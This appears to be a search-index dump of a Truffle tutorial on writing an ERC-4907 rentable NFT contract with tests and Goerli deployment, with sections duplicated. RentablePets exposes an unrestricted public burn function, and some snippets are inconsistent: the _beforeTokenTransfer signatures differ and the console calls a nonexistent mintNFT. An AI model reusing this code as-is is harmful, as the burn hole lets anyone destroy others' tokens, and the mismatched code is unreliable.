defined in IERC4907 to communicate relevant information when setting a new user. userOf \u00b6 Next, we want to be able to identify who the current user of an NFT is. Add userOf to your contract: /// @notice Get the user address of an NFT /// @dev The zero address indicates that there is no user or the user is expired /// @param tokenId The NFT to get the user address for /// @return The user address for this NFT function userOf ( uint256 tokenId ) public view virtual override returns ( address ) { if ( uint256 ( _users [ tokenId ]. expires ) >= block . timestamp ) { return _users [ tokenId ]. user ; } else { return address ( 0 ); } } This function takes the tokenId as an argument and will return the user address if that token is still being rented. Otherwise, the zero address indicates that the NFT is not being rented. userExpires \u00b6 Add the userExpires function so that dapps can retrieve expiration date information for a specific NFT: /// @notice Get the user expires of an NFT /// @dev The zero value indicates that there is no user /// @param tokenId The NFT to get the user expires for /// @return The user expires for this NFT function userExpires ( uint256 tokenId ) public view virtual override returns ( uint256 ){ return _users [ tokenId ]. expires ; } If tokenId does not exist, then a UserInfo with default values will be returned. In this case, the default for the user address will be address(0) , and expires , which is an uint64 , will be 0 . supportsInterface \u00b6 In order for a dapp to know whether or not our NFT is rentable, it needs to be able to check for the interfaceId ! To do so, override the supportsInterface function as defined in the EIP-165 standard . /// @dev See {IERC165-supportsInterface}. function supportsInterface ( bytes4 interfaceId ) public view virtual override returns ( bool ) { return interfaceId == type ( IERC4907 ). interfaceId || super . supportsInterface ( interfaceId ); } _beforeTokenTransfer \u00b6 This is the final function we will implement! When the token is transferred (i.e., the owner changes) or burned, we want to remove the rental information as well. Note that this behavior is inherited from OpenZeppelin's ERC721 implementation. We will override _beforeTokenTransfer from ERC721 to add in this functionality: function _beforeTokenTransfer ( address from , address to , uint256 tokenId , uint256 batchSize ) internal virtual override { super . _beforeTokenTransfer ( from , to , tokenId , batchSize ); if ( from != to && _users [ tokenId ]. user != address ( 0 )) { delete _users [ tokenId ]; emit UpdateUser ( tokenId , address ( 0 ), 0 ); } } In order to delete the UserInfo from the mapping, we want to make sure there was actually a transfer of ownership and there was UserInfo on it in the first place. Once verified, we can delete and emit an event that the UserInfo was updated! Note that it is up to you, the contract writer, to decide if this is how you expect token transfers and burns to behave. You might choose to ignore this and say that rentees maintain their user status even when ownership changes! Now, your final contract should look like this: // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\" ; import \"./IERC4907.sol\" ; contract ERC4907 is ERC721URIStorage , IERC4907 { struct UserInfo { address user ; // address of user role uint64 expires ; // unix timestamp, user expires } mapping ( uint256 => UserInfo ) internal _users ; constructor ( string memory name_ , string memory symbol_ ) ERC721 ( name_ , symbol_ ) {} /// @notice set the user and expires of a NFT /// @dev The zero address indicates there is no user /// Throws if `tokenId` is not valid NFT /// @param user The new user of the NFT /// @param expires UNIX timestamp, The new user could use the NFT before expires function setUser ( uint256 tokenId , address user , uint64 expires ) public virtual override { require ( _isApprovedOrOwner ( msg . sender , tokenId ), \"ERC721: transfer caller is not owner nor approved\" ); UserInfo storage info = _users [ tokenId ]; info . user = user ; info . expires = expires ; emit UpdateUser ( tokenId , user , expires ); } /// @notice Get the user address of an NFT /// @dev The zero address indicates that there is no user or the user is expired /// @param tokenId The NFT to get the user address for /// @return The user address for this NFT function userOf ( uint256 tokenId ) public view virtual override returns ( address ) { if ( uint256 ( _users [ tokenId ]. expires ) >= block . timestamp ) { return _users [ tokenId ]. user ; } else { return address ( 0 ); } } /// @notice Get the user expires of an NFT /// @dev The zero value indicates that there is no user /// @param tokenId The NFT to get the user expires for /// @return The user expires for this NFT function userExpires ( uint256 tokenId ) public view virtual override returns ( uint256 ) { return _users [ tokenId ]. expires ; } /// @dev See {IERC165-supportsInterface}. function supportsInterface ( bytes4 interfaceId ) public view virtual override returns ( bool ) { return interfaceId == type ( IERC4907 ). interfaceId || super . supportsInterface ( interfaceId ); } function _beforeTokenTransfer ( address from , address to , uint256 tokenId ) internal virtual override { super . _beforeTokenTransfer ( from , to , tokenId ); if ( from != to && _users [ tokenId ]. user != address ( 0 )) { delete _users [ tokenId ]; emit UpdateUser ( tokenId , address ( 0 ), 0 ); } } } Write the RentablePets Smart Contract \u00b6 Finally, we can write an NFT that utilizes the ERC4907 contract we just implemented. We are following the same NFT format as written in previous guides. You can look through those for a more in-depth explanation. We're exposing the burn function so that we can test it. Don't include this method if you don't want your NFT to be transferrable! Your final contract should look like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"./ERC4907.sol\" ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; contract RentablePets is ERC4907 { using Counters for Counters . Counter ; Counters . Counter private _tokenIds ; constructor () ERC4907 ( \"RentablePets\" , \"RP\" ) {} function mint ( string memory _tokenURI ) public { _tokenIds . increment (); uint256 newTokenId = _tokenIds . current (); _safeMint ( msg . sender , newTokenId ); _setTokenURI ( newTokenId , _tokenURI ); } function burn ( uint256 tokenId ) public { _burn ( tokenId ); } } Start a Local Blockchain \u00b6 In order to deploy and test our smart contracts, we'll need to modify migrations/1_deploy_contracts.js like so: const RentablePets = artifacts . require ( \"RentablePets\" ); module . exports = function ( deployer ) { deployer . deploy ( RentablePets ); }; Next, let's get a local Ganache instance up. There are a variety of ways to do so: through the VS Code extension, Ganache CLI, and the Ganche graphical user interface. Each has its own advantages, and you can check out v7's coolest features here . In this tutorial, we'll be using the GUI. Open it up, create a workspace, and hit save (feel free to add your project to use some of the nifty features from the Ganache UI)! This creates a running Ganache instance at HTTP://127.0.0.1:7545. Next, uncomment the development network in your truffle-config.js and modify the port number to 7545 to match. development : { host : \"127.0.0.1\" , // Localhost (default: none) port : 7545 , // Standard Ethereum port (default: none) network_id : \"*\" , // Any network (default: none) } Test Your Smart Contract \u00b6 If you want to test your smart contract commands on the fly without writing a full test, you can do so through truffle develop or truffle console . Read more about it here . For the purposes of this tutorial, we'll just go ahead and write a Javascript test. Note that with Truffle, you have the option of writing tests in Javascript, Typescript, or Solidity. We want to test the following functionality: 1. That RentablePets is an ERC721 and ERC4907 2. That setUser cannot be called by someone other than the owner 3. That setUser can be correctly called by the owner 4. That burn will properly delete UserInfo As part of testing, we'll want to make sure that events are properly emitted, as well as our require statement failing correctly. OpenZeppelin has some really nifty test helpers that we'll be using. Download it: npm install --save-dev @openzeppelin/test-helpers The complete test looks like this: require ( \"@openzeppelin/test-helpers/configure\" )({ provider : web3 . currentProvider , singletons : { abstraction : \"truffle\" , }, }); const { constants , expectRevert , expectEvent } = require ( '@openzeppelin/test-helpers' ); const RentablePets = artifacts . require ( \"RentablePets\" ); contract ( \"RentablePets\" , function ( accounts ) { it ( \"should support the ERC721 and ERC4907 standards\" , async () => { const rentablePetsInstance = await RentablePets . deployed (); const ERC721InterfaceId = \"0x80ac58cd\" ; const ERC4907InterfaceId = \"0xad092b5c\" ; var isERC721 = await rentablePetsInstance . supportsInterface ( ERC721InterfaceId ); var isER4907 = await rentablePetsInstance . supportsInterface ( ERC4907InterfaceId ); assert . equal ( isERC721 , true , \"RentablePets is not an ERC721\" ); assert . equal ( isER4907 , true , \"RentablePets is not an ERC4907\" ); }); it ( \"should not set UserInfo if not the owner\" , async () => { const rentablePetsInstance = await RentablePets . deployed (); const expirationDatePast = 1660252958 ; // Aug 8 2022 await rentablePetsInstance . mint ( \"fakeURI\" ); // Failed require in function await expectRevert ( rentablePetsInstance . setUser ( 1 , accounts [ 1 ], expirationDatePast , { from : accounts [ 1 ]}), \"ERC721: transfer caller is not owner nor approved\" ); // Assert no UserInfo for NFT var user = await rentablePetsInstance . userOf . call ( 1 ); var date = await rentablePetsInstance . userExpires . call ( 1 ); assert . equal ( user , constants . ZERO_ADDRESS , \"NFT user is not zero address\" ); assert . equal ( date , 0 , \"NFT expiration date is not 0\" ); }); it ( \"should return the correct UserInfo\" , async () => { const rentablePetsInstance = await RentablePets . deployed (); const expirationDatePast = 1660252958 ; // Aug 8 2022 const expirationDateFuture = 4121727755 ; // Aug 11 2100 await rentablePetsInstance . mint ( \"fakeURI\" ); await rentablePetsInstance . mint ( \"fakeURI\" ); // Set and get UserInfo var expiredTx = await rentablePetsInstance . setUser ( 2 , accounts [ 1 ], expirationDatePast ) var unexpiredTx = await rentablePetsInstance . setUser ( 3 , accounts [ 2 ], expirationDateFuture ) var expiredNFTUser = await rentablePetsInstance . userOf . call ( 2 ); var expiredNFTDate = await rentablePetsInstance . userExpires . call ( 2 ); var unexpireNFTUser = await rentablePetsInstance . userOf . call ( 3 ); var unexpiredNFTDate = await rentablePetsInstance . userExpires . call ( 3 ); // Assert UserInfo and event transmission assert . equal ( expiredNFTUser , constants . ZERO_ADDRESS , \"Expired NFT has wrong user\" ); assert . equal ( expiredNFTDate , expirationDatePast , \"Expired NFT has wrong expiration date\" ); expectEvent ( expiredTx , \"UpdateUser\" , { tokenId : \"2\" , user : accounts [ 1 ], expires : expirationDatePast . toString ()}); assert . equal ( unexpireNFTUser , accounts [ 2 ], \"Expired NFT has wrong user\" ); assert . equal ( unexpiredNFTDate , expirationDateFuture , \"Expired NFT has wrong expiration date\" ); expectEvent ( unexpiredTx , \"UpdateUser\" , { tokenId : \"3\" , user : accounts [ 2 ], expires : expirationDateFuture . toString ()}); // Burn NFT unexpiredTx = await rentablePetsInstance . burn ( 3 ); // Assert UserInfo was deleted unexpireNFTUser = await rentablePetsInstance . userOf . call ( 3 ); unexpiredNFTDate = await rentablePetsInstance . userExpires . call ( 3 ); assert . equal ( unexpireNFTUser , constants . ZERO_ADDRESS , \"NFT user is not zero address\" ); assert . equal ( unexpiredNFTDate , 0 , \"NFT expiration date is not 0\" ); expectEvent ( unexpiredTx , \"UpdateUser\" , { tokenId : \"3\" , user : constants . ZERO_ADDRESS , expires : \"0\" }); }); }); There's one special thing to call out here: To test that setUser fails when msg.sender is not owner , we can fake the sender by adding the extra from param: rentablePetsInstance . setUser ( 1 , accounts [ 1 ], expirationDatePast , { from : accounts [ 1 ]}) If you run into issues testing, using the Truffle debugger is really helpful! Mint an NFT and View it in Your Mobile Wallet or OpenSea! \u00b6 If you want to mint an NFT for yourself and view it in your mobile MetaMask wallet, you'll need to deploy your contract to a public testnet or mainnet. To do so, you'll need to grab your Infura project API from your Infura project and your MetaMask wallet secret key. At the root of your folder, add a .env file, in which we'll put in that information. WARNING: DO NOT PUBLICIZE OR COMMIT THIS FILE. We recommend adding .env to a .gitignore file. MNEMONIC = \"YOUR SECRET KEY\" INFURA_API_KEY = \"YOUR INFURA_API_KEY\" Then, at the top of truffle-config.js , add this code to get retrieve that information: require ( 'dotenv' ). config (); const mnemonic = process . env [ \"MNEMONIC\" ]; const infuraApiKey = process . env [ \"INFURA_API_KEY\" ]; const HDWalletProvider = require ( '@truffle/hdwallet-provider' ); And finally, add the Goerli network to the networks list under module.exports : goerli : { provider : () => new HDWalletProvider ( mnemonic , `https://goerli.infura.io/v3/ ${ infuraApiKey } ` ), network_id : 5 , // Goerli's network id chain_id : 5 , // Goerli's chain id gas : 5500000 , // Gas limit used for deploys. confirmations : 2 , // # of confirmations to wait between deployments. (default: 0) timeoutBlocks : 200 , // # of blocks before a deployment times out (minimum/default: 50) skipDryRun : true // Skip dry run before migrations? (default: false for public nets) } Your final truffle-config.js should look something like this: require ( 'dotenv' ). config (); const mnemonic = process . env [ \"MNEMONIC\" ]; const infuraApiKey = process . env [ \"INFURA_API_KEY\" ]; const HDWalletProvider = require ( '@truffle/hdwallet-provider' ); module . exports = { networks : { development : { host : \"127.0.0.1\" , // Localhost (default: none) port : 7545 , // Standard Ethereum port (default: none) network_id : \"*\" , // Any network (default: none) }, goerli : { provider : () => new HDWalletProvider ( mnemonic , `https://goerli.infura.io/v3/ ${ infuraApiKey } ` ), network_id : 5 , // Goerli's network id chain_id : 5 , // Goerli's chain id gas : 5500000 , // Gas limit used for deploys. confirmations : 2 , // # of confirmations to wait between deployments. (default: 0) timeoutBlocks : 200 , // # of blocks before a deployment times out (minimum/default: 50) skipDryRun : true // Skip dry run before migrations? (default: false for public nets) } }, // Set default mocha options here, use special reporters, etc. mocha : { // timeout: 100000 }, // Configure your compilers compilers : { solc : { version : \"0.8.15\" , // Fetch exact version from solc-bin (default: truffle's version) } }, }; Then, we'll need to install the dev dependencies for dotenv and @truffle/hdwallet-provider . Lastly, run truffle migrate --network goerli to deploy! npm i --save-dev dotenv npm i --save-dev @truffle/hdwallet-provider truffle migrate --network goerli Then, to quickly interact with the goerli network, we can use truffle console --network goerli , and call the appropriate contract functions. We've already pinned some metadata to IPFS for you to use as your tokenURI: ipfs://bafybeiffapvkruv2vwtomswqzxiaxdgm2dflet2cxmh6t4ixrgaezumbw4 . It should look a bit like this: truffle migrate --network goerli truffle ( goerli ) > const contract = await RentablePets.deployed () undefined truffle ( goerli ) > await contract.mintNFT ( \"YOUR ADDRESS\" , \"ipfs://bafybeiffapvkruv2vwtomswqzxiaxdgm2dflet2cxmh6t4ixrgaezumbw4\" ) If you want to populate your own metadata, there are a variety of ways to do so - with either Truffle or Infura. Check out the guides here: - truffle preserve - infura IPFS To view your NFT on your mobile wallet, open up MetaMask mobile, switch to the Goerli network, and open the NFTs tab! To view on OpenSea, you'll have to deploy to mainnet or Polygon. Otherwise, if you deploy your contract to rinkeby , you can view it on https://testnets.opensea.io/ . To be aware that rinkeby will be deprecated after the merge . If you don't want to monitor your transactions in an Infura project, you can also deploy via Truffle Dashboard , which allows you to deploy and sign transactions via MetaMask - thus never revealing your private key! To do so, simply run: truffle dashboard truffle migrate --network dashboard truffle console --network dashboard Future Extensions \u00b6 And there you have it! You've written a rentable NFT contract! Look out for a more in-depth guide for uploading your metadata to IPFS! For a more a detailed walkthrough of the code, be sure to watch the livestream on YouTube . In future editions of Web3 Unleashed, get excited to integrate this into a full-stack DApp. That is, a NFT rental marketplace that will use both the ERC-4907 rentable standard and ERC-2981 royalty standard If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, start a discussion here . If you want to show off what you built or just hang with the Unleashed community in general, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Web3 Unleashed: Write a Rentable NFT Smart Contract"}, {"location": "guides/rentable-nft/#web3-unleashed-write-a-rentable-nft-smart-contract", "text": "Written by Emily Lin and Leandro Faria Last updated 11/15/2022", "title": "Web3 Unleashed: Write a Rentable NFT Smart Contract"}, {"location": "guides/rentable-nft/#overview", "text": "In this guide, we'll be covering what the ERC-4907 rentable NFT standard is and how we can implement one using Truffle! Watch our livestream recording with Jesse Luong from Double Protocol , the creators of the ERC-4907 standard on YouTube for a more in-depth explanation and exploration into the standard's impact on GameFi and the metaverse!", "title": "Overview"}, {"location": "guides/rentable-nft/#what-is-the-erc-4907", "text": "NFT renting has become a growing use case for utility based NFTs - for example, virtual land in the metaverse or in-game NFT assets. In the first episode of Web3 Unleashed, we learned that ERCs are application level standards that establish a shared interface for contracts and dapps to reliably interact with each other. In this case, ERC-4907 standardizes the way NFT rentals happen by separating the concept of user and owner . This allows us to identify permissioned roles on the NFT. That is, a user has the ability to use the NFT, but does not have the permission to sell it. In addition, an expires function is introduced, so that the user only has temporary access to use the NFT.", "title": "What is the ERC-4907?"}, {"location": "guides/rentable-nft/#whats-in-an-erc-4907", "text": "The interface is specified as follows: interface IERC4907 { // Logged when the user of a NFT is changed or expires is changed /// @notice Emitted when the `user` of an NFT or the `expires` of the `user` is changed /// The zero address for user indicates that there is no user address event UpdateUser ( uint256 indexed tokenId , address indexed user , uint64 expires ); /// @notice set the user and expires of a NFT /// @dev The zero address indicates there is no user /// Throws if `tokenId` is not valid NFT /// @param user The new user of the NFT /// @param expires UNIX timestamp, The new user could use the NFT before expires function setUser ( uint256 tokenId , address user , uint64 expires ) external ; /// @notice Get the user address of an NFT /// @dev The zero address indicates that there is no user or the user is expired /// @param tokenId The NFT to get the user address for /// @return The user address for this NFT function userOf ( uint256 tokenId ) external view returns ( address ); /// @notice Get the user expires of an NFT /// @dev The zero value indicates that there is no user /// @param tokenId The NFT to get the user expires for /// @return The user expires for this NFT function userExpires ( uint256 tokenId ) external view returns ( uint256 ); } Additionally: - The userOf(uint256 tokenId) function MAY be implemented as pure or view . - The userExpires(uint256 tokenId) function MAY be implemented as pure or view . - The setUser(uint256 tokenId, address user, uint64 expires) function MAY be implemented as public or external . - The UpdateUser event MUST be emitted when a user address is changed or the user expires is changed. - The supportsInterface method MUST return true when called with 0xad092b5c .", "title": "What's in an ERC-4907?"}, {"location": "guides/rentable-nft/#lets-write-an-erc-4907", "text": "Let's get started writing a rentable NFT! You can find the completed code here . We'll be importing Open Zeppelin's contracts, which provide secure, pre-written implementations of the ERC that our contract can just inherit! Note that we will not be covering the basics of the ERC-721 standard. You can find a great Infura blog detailing what it is and how to implement it here .", "title": "Let's Write an ERC-4907!"}, {"location": "guides/rentable-nft/#download-system-requirements", "text": "You'll need to install: Node.js , v12 or higher truffle ganache UI or ganache CLI", "title": "Download System Requirements"}, {"location": "guides/rentable-nft/#create-an-infura-account-and-project", "text": "To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it rentable-nft , and select Web3 API from the dropdown", "title": "Create an Infura account and project"}, {"location": "guides/rentable-nft/#register-for-a-metamask-wallet", "text": "To interact with your DApp in the browser, you'll need a MetaMask wallet. Sign up for an account here .", "title": "Register for a MetaMask wallet"}, {"location": "guides/rentable-nft/#download-vs-code", "text": "Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here .", "title": "Download VS Code"}, {"location": "guides/rentable-nft/#get-some-test-eth", "text": "In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Paradigm has a great MultiFaucet that deposits funds across 8 different networks all at once.", "title": "Get Some Test Eth"}, {"location": "guides/rentable-nft/#set-up-your-project", "text": "Truffle has some nifty functions to scaffold your truffle project and add example contracts and tests. We'll be building our project in a folder called rentable-nft . truffle init rentable-nft cd rentable-nft truffle create contract RentablePets truffle create contract IERC4907 truffle create contract ERC4907 truffle create test TestRentablePets Afterwards, your project structure should look something like this: rentable-nft \u251c\u2500\u2500 contracts \u2502 \u251c\u2500\u2500 ERC4907.sol \u2502 \u251c\u2500\u2500 IERC4907.sol \u2502 \u2514\u2500\u2500 RentablePets.sol \u251c\u2500\u2500 migrations \u2502 \u2514\u2500\u2500 1_deploy_contracts.js \u251c\u2500\u2500 test \u2502 \u2514\u2500\u2500 test_rentable_pets.js \u2514\u2500\u2500 truffle-config.js", "title": "Set Up Your Project"}, {"location": "guides/rentable-nft/#write-the-erc-4907-interface", "text": "Now, let's add the interface functions defined in the EIP . To do this, go to IERC4907.sol and change contract to interface . Then, we'll just copy and paste what was specified on the EIP! It should look like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; interface IERC4907 { // Logged when the user of a NFT is changed or expires is changed /// @notice Emitted when the `user` of an NFT or the `expires` of the `user` is changed /// The zero address for user indicates that there is no user address event UpdateUser ( uint256 indexed tokenId , address indexed user , uint64 expires ); /// @notice set the user and expires of a NFT /// @dev The zero address indicates there is no user /// Throws if `tokenId` is not valid NFT /// @param user The new user of the NFT /// @param expires UNIX timestamp, The new user could use the NFT before expires function setUser ( uint256 tokenId , address user , uint64 expires ) external ; /// @notice Get the user address of an NFT /// @dev The zero address indicates that there is no user or the user is expired /// @param tokenId The NFT to get the user address for /// @return The user address for this NFT function userOf ( uint256 tokenId ) external view returns ( address ); /// @notice Get the user expires of an NFT /// @dev The zero value indicates that there is no user /// @param tokenId The NFT to get the user expires for /// @return The user expires for this NFT function userExpires ( uint256 tokenId ) external view returns ( uint256 ); } Once you've created this file you shouldn't need to touch it again.", "title": "Write the ERC-4907 Interface"}, {"location": "guides/rentable-nft/#write-the-erc-4907-smart-contract", "text": "Now, let's write an ERC-4907 smart contract that extends OpenZeppelin's ERC-721URIStorage contract. First, install OpenZeppelin's contracts: npm i @openzeppelin/contracts@4.8.0 The basics of an ERC-721 are covered in this Infura blog . We choose to use ERC721URIStorage so that we don't have to use a static metadata file to populate the tokenURI . To do this, import the interface we created and OpenZeppelin's ERC721URIStorage implementation and have our ERC4907 smart contract inherit their properties as follows: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts/token/ERC721/ERC721URIStorage.sol\" ; import \"./IERC4907.sol\" ; contract ERC4907 is ERC721URIStorage , IERC4907 { constructor () public { } } Then, we'll modify the constructor to take in the NFT collection name and symbol when the contract is deployed. contract ERC4907 is ERC721 , IERC4907 { constructor ( string memory _name , string memory _symbol ) ERC721 ( _name , _symbol ){ } } Before we start implementing the functions defined in IERC4907 , let's set up two state variables UserInfo and _users to help define and store the concept of user . contract ERC4907 is ERC721URIStorage , IERC4907 { struct UserInfo { address user ; // address of user role uint64 expires ; // unix timestamp, user expires } mapping ( uint256 => UserInfo ) internal _users ; UserInfo stores the user's address and the rental expiration date _users maps the tokenId of the relevant NFT to the appropriate user (rentee) Finally, let's get started on implementing the interface functions!", "title": "Write the ERC-4907 Smart Contract"}, {"location": "guides/rentable-nft/#setuser", "text": "This function can only be called by the owner of the NFT. It allows the owner to specify who will be the rentee of the NFT. The user now has the NFT in their wallet, but cannot perform any actions on it such as burn or transfer. Add this function to your ERC4907.sol file: /// @notice set the user and expires of a NFT /// @dev The zero address indicates there is no user /// Throws if `tokenId` is not valid NFT /// @param user The new user of the NFT /// @param expires UNIX timestamp, The new user could use the NFT before expires function setUser ( uint256 tokenId , address user , uint64 expires ) public virtual override { require ( _isApprovedOrOwner ( msg . sender , tokenId ), \"ERC721: transfer caller is not owner nor approved\" ); UserInfo storage info = _users [ tokenId ]; info . user = user ; info . expires = expires ; emit UpdateUser ( tokenId , user , expires ); } This function will update the UserInfo struct with the address of the rentee and the block timestamp that the renting period will expires . We use the inherited function _isApprovedOrOwner from ERC721 to indicate only the owner has the ability to decide who can user the NFT. Lastly, we will emit an UpdateUser event defined in IERC4907 to communicate relevant information when setting a new user.", "title": "setUser"}, {"location": "guides/rentable-nft/#userof", "text": "Next, we want to be able to identify who the current user of an NFT is. Add userOf to your contract: /// @notice Get the user address of an NFT /// @dev The zero address indicates that there is no user or the user is expired /// @param tokenId The NFT to get the user address for /// @return The user address for this NFT function userOf ( uint256 tokenId ) public view virtual override returns ( address ) { if ( uint256 ( _users [ tokenId ]. expires ) >= block . timestamp ) { return _users [ tokenId ]. user ; } else { return address ( 0 ); } } This function takes the tokenId as an argument and will return the user address if that token is still being rented. Otherwise, the zero address indicates that the NFT is not being rented.", "title": "userOf"}, {"location": "guides/rentable-nft/#userexpires", "text": "Add the userExpires function so that dapps can retrieve expiration date information for a specific NFT: /// @notice Get the user expires of an NFT /// @dev The zero value indicates that there is no user /// @param tokenId The NFT to get the user expires for /// @return The user expires for this NFT function userExpires ( uint256 tokenId ) public view virtual override returns ( uint256 ){ return _users [ tokenId ]. expires ; } If tokenId does not exist, then a UserInfo with default values will be returned. In this case, the default for the user address will be address(0) , and expires , which is an uint64 , will be 0 .", "title": "userExpires"}, {"location": "guides/rentable-nft/#supportsinterface", "text": "In order for a dapp to know whether or not our NFT is rentable, it needs to be able to check for the interfaceId ! To do so, override the supportsInterface function as defined in the EIP-165 standard . /// @dev See {IERC165-supportsInterface}. function supportsInterface ( bytes4 interfaceId ) public view virtual override returns ( bool ) { return interfaceId == type ( IERC4907 ). interfaceId || super . supportsInterface ( interfaceId ); }", "title": "supportsInterface"}, {"location": "guides/rentable-nft/#_beforetokentransfer", "text": "This is the final function we will implement! When the token is transferred (i.e., the owner changes) or burned, we want to remove the rental information as well. Note that this behavior is inherited from OpenZeppelin's ERC721 implementation. We will override _beforeTokenTransfer from ERC721 to add in this functionality: function _beforeTokenTransfer ( address from , address to , uint256 tokenId , uint256 batchSize ) internal virtual override { super . _beforeTokenTransfer ( from , to , tokenId , batchSize ); if ( from != to && _users [ tokenId ]. user != address ( 0 )) { delete _users [ tokenId ]; emit UpdateUser ( tokenId , address ( 0 ), 0 ); } } In order to delete the UserInfo from the mapping, we want to make sure there was actually a transfer of ownership and there was UserInfo on it in the first place. Once verified, we can delete and emit an event that the UserInfo was updated! Note that it is up to you, the contract writer, to decide if this is how you expect token transfers and burns to behave. You might choose to ignore this and say that rentees maintain their user status even when ownership changes! Now, your final contract should look like this: // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\" ; import \"./IERC4907.sol\" ; contract ERC4907 is ERC721URIStorage , IERC4907 { struct UserInfo { address user ; // address of user role uint64 expires ; // unix timestamp, user expires } mapping ( uint256 => UserInfo ) internal _users ; constructor ( string memory name_ , string memory symbol_ ) ERC721 ( name_ , symbol_ ) {} /// @notice set the user and expires of a NFT /// @dev The zero address indicates there is no user /// Throws if `tokenId` is not valid NFT /// @param user The new user of the NFT /// @param expires UNIX timestamp, The new user could use the NFT before expires function setUser ( uint256 tokenId , address user , uint64 expires ) public virtual override { require ( _isApprovedOrOwner ( msg . sender , tokenId ), \"ERC721: transfer caller is not owner nor approved\" ); UserInfo storage info = _users [ tokenId ]; info . user = user ; info . expires = expires ; emit UpdateUser ( tokenId , user , expires ); } /// @notice Get the user address of an NFT /// @dev The zero address indicates that there is no user or the user is expired /// @param tokenId The NFT to get the user address for /// @return The user address for this NFT function userOf ( uint256 tokenId ) public view virtual override returns ( address ) { if ( uint256 ( _users [ tokenId ]. expires ) >= block . timestamp ) { return _users [ tokenId ]. user ; } else { return address ( 0 ); } } /// @notice Get the user expires of an NFT /// @dev The zero value indicates that there is no user /// @param tokenId The NFT to get the user expires for /// @return The user expires for this NFT function userExpires ( uint256 tokenId ) public view virtual override returns ( uint256 ) { return _users [ tokenId ]. expires ; } /// @dev See {IERC165-supportsInterface}. function supportsInterface ( bytes4 interfaceId ) public view virtual override returns ( bool ) { return interfaceId == type ( IERC4907 ). interfaceId || super . supportsInterface ( interfaceId ); } function _beforeTokenTransfer ( address from , address to , uint256 tokenId ) internal virtual override { super . _beforeTokenTransfer ( from , to , tokenId ); if ( from != to && _users [ tokenId ]. user != address ( 0 )) { delete _users [ tokenId ]; emit UpdateUser ( tokenId , address ( 0 ), 0 ); } } }", "title": "_beforeTokenTransfer"}, {"location": "guides/rentable-nft/#write-the-rentablepets-smart-contract", "text": "Finally, we can write an NFT that utilizes the ERC4907 contract we just implemented. We are following the same NFT format as written in previous guides. You can look through those for a more in-depth explanation. We're exposing the burn function so that we can test it. Don't include this method if you don't want your NFT to be transferrable! Your final contract should look like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"./ERC4907.sol\" ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; contract RentablePets is ERC4907 { using Counters for Counters . Counter ; Counters . Counter private _tokenIds ; constructor () ERC4907 ( \"RentablePets\" , \"RP\" ) {} function mint ( string memory _tokenURI ) public { _tokenIds . increment (); uint256 newTokenId = _tokenIds . current (); _safeMint ( msg . sender , newTokenId ); _setTokenURI ( newTokenId , _tokenURI ); } function burn ( uint256 tokenId ) public { _burn ( tokenId ); } }", "title": "Write the RentablePets Smart Contract"}, {"location": "guides/rentable-nft/#start-a-local-blockchain", "text": "In order to deploy and test our smart contracts, we'll need to modify migrations/1_deploy_contracts.js like so: const RentablePets = artifacts . require ( \"RentablePets\" ); module . exports = function ( deployer ) { deployer . deploy ( RentablePets ); }; Next, let's get a local Ganache instance up. There are a variety of ways to do so: through the VS Code extension, Ganache CLI, and the Ganche graphical user interface. Each has its own advantages, and you can check out v7's coolest features here . In this tutorial, we'll be using the GUI. Open it up, create a workspace, and hit save (feel free to add your project to use some of the nifty features from the Ganache UI)! This creates a running Ganache instance at HTTP://127.0.0.1:7545. Next, uncomment the development network in your truffle-config.js and modify the port number to 7545 to match. development : { host : \"127.0.0.1\" , // Localhost (default: none) port : 7545 , // Standard Ethereum port (default: none) network_id : \"*\" , // Any network (default: none) }", "title": "Start a Local Blockchain"}, {"location": "guides/rentable-nft/#test-your-smart-contract", "text": "If you want to test your smart contract commands on the fly without writing a full test, you can do so through truffle develop or truffle console . Read more about it here . For the purposes of this tutorial, we'll just go ahead and write a Javascript test. Note that with Truffle, you have the option of writing tests in Javascript, Typescript, or Solidity. We want to test the following functionality: 1. That RentablePets is an ERC721 and ERC4907 2. That setUser cannot be called by someone other than the owner 3. That setUser can be correctly called by the owner 4. That burn will properly delete UserInfo As part of testing, we'll want to make sure that events are properly emitted, as well as our require statement failing correctly. OpenZeppelin has some really nifty test helpers that we'll be using. Download it: npm install --save-dev @openzeppelin/test-helpers The complete test looks like this: require ( \"@openzeppelin/test-helpers/configure\" )({ provider : web3 . currentProvider , singletons : { abstraction : \"truffle\" , }, }); const { constants , expectRevert , expectEvent } = require ( '@openzeppelin/test-helpers' ); const RentablePets = artifacts . require ( \"RentablePets\" ); contract ( \"RentablePets\" , function ( accounts ) { it ( \"should support the ERC721 and ERC4907 standards\" , async () => { const rentablePetsInstance = await RentablePets . deployed (); const ERC721InterfaceId = \"0x80ac58cd\" ; const ERC4907InterfaceId = \"0xad092b5c\" ; var isERC721 = await rentablePetsInstance . supportsInterface ( ERC721InterfaceId ); var isER4907 = await rentablePetsInstance . supportsInterface ( ERC4907InterfaceId ); assert . equal ( isERC721 , true , \"RentablePets is not an ERC721\" ); assert . equal ( isER4907 , true , \"RentablePets is not an ERC4907\" ); }); it ( \"should not set UserInfo if not the owner\" , async () => { const rentablePetsInstance = await RentablePets . deployed (); const expirationDatePast = 1660252958 ; // Aug 8 2022 await rentablePetsInstance . mint ( \"fakeURI\" ); // Failed require in function await expectRevert ( rentablePetsInstance . setUser ( 1 , accounts [ 1 ], expirationDatePast , { from : accounts [ 1 ]}), 